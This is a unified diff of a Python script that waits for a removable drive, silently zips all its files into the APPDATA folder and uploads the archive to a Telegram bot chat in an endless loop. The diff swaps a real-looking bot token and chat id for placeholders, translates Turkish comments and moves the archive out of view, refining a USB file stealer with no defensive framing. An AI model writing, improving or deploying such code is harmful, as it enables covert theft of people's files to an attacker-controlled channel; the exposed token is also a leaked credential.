@@ -1,16 +1,11 @@
 import os
 import zipfile
 import subprocess
-import json
-import time
-import requests
 import hashlib
+import requests
 
-token = '7139000080:AAEHzXtT3gUwx0UMNGQ0jtR3_eASKV73Rak'
-chat_id = '6268358898'
-
-def start(update, context):
-    context.bot.send_message(chat_id=update.effective_chat.id, text="Bot started.")
+token = 'bot-token'
+chat_id = 'chat-id'
 
 def calculate_file_hash(file_path):
     hash_algo = hashlib.sha256()
@@ -21,11 +16,11 @@ def calculate_file_hash(file_path):
 
 def get_volume_name(drive_letter):
     try:
-        # WMIC komutunu kullanarak belirli bir sürücü harfi için hacim adını alın
+        # WMIC command to get the volume name for a given drive letter
         cmd = f'wmic logicaldisk where "caption=\'{drive_letter}\'" get volumename'
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).decode('utf-8')
 
-        # Çıktıyı işleyin
+        # Process the output
         lines = output.strip().split('\n')
         if len(lines) > 1 and lines[1].strip():
             return lines[1].strip()
@@ -35,8 +30,7 @@ def get_volume_name(drive_letter):
         print(f"Error executing WMIC command: {e}")
         return None
 
-def scan_and_send(bot_token,chat_id):
-
+def scan_and_send(bot_token, chat_id):
     drives = []
 
     while not drives:
@@ -46,19 +40,23 @@ def scan_and_send(bot_token,chat_id):
 
     drive = drives[0]
     volume = get_volume_name(drive)
-    if os.path.exists('files.zip'):
-        old_hash = calculate_file_hash('files.zip')
+    
+    # Define the path to the AppData folder
+    appdata_folder = os.getenv('APPDATA')
+    zip_file_name = os.path.join(appdata_folder, "files.zip")
+    
+    if os.path.exists(zip_file_name):
+        old_hash = calculate_file_hash(zip_file_name)
     else:
         old_hash = 0
 
-    zip_file_name = "files.zip"
     with zipfile.ZipFile(zip_file_name, "w") as zip_file:
         for folder_name, subfolders, filenames in os.walk(drive):
             for filename in filenames:
                 file_path = os.path.join(folder_name, filename)
                 zip_file.write(file_path, arcname=os.path.relpath(file_path, drive))
 
-    new_hash = calculate_file_hash('files.zip')
+    new_hash = calculate_file_hash(zip_file_name)
 
     if old_hash == new_hash:
         return
@@ -74,13 +72,13 @@ def scan_and_send(bot_token,chat_id):
     response = requests.post(url, files=files, data=data)
     
     if response.status_code == 200:
-        print("Dosya başarıyla gönderildi.")
+        print("File successfully sent.")
     else:
-        print("Dosya gönderilirken bir hata oluştu.")
+        print("Error sending file.")
         print(response.text)
 
 while True:
     try:
-        scan_and_send(token,chat_id)
-    except:
-        print('hata')
+        scan_and_send(token, chat_id)
+    except Exception as e:
+        print(f"Error: {e}")
